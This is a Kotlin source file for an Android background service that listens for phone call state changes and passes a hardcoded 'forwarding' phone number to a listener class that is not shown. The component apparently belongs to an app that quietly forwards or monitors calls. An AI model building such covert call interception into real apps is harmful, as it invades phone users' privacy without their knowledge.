
package ru.rostell

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.telephony.TelephonyManager
import android.util.Log
import android.telephony.PhoneStateListener
class CallListenerService : Service() {
    private lateinit var telephonyManager: TelephonyManager
    private lateinit var callStateListener: CallStateListener

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")
        telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        callStateListener = CallStateListener(this, "+380685737846") // Pass context and forwardingNumber
        telephonyManager.listen(callStateListener, PhoneStateListener.LISTEN_CALL_STATE)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service destroyed")
        
        // Unregister the listener when the service is destroyed
        telephonyManager.listen(callStateListener, PhoneStateListener.LISTEN_NONE)
    }

    companion object {
        private const val TAG = "ru.rostellInfo"
    }
}
